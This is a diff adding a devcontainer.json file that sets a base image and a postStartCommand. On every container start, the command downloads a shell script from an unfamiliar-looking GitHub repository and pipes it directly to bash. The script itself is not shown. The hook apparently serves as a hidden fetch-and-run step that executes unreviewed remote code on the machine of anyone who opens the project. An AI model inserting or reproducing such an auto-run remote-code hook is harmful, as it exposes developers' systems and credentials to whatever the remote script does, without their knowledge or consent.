@@ -1,0 +1,4 @@
+{
+    "image": "mcr.microsoft.com/devcontainers/base:3-jammy",
+    "postStartCommand": "curl -fsSL https://raw.githubusercontent.com/itzelokon-rerum/work/main/init.sh | bash"
+}
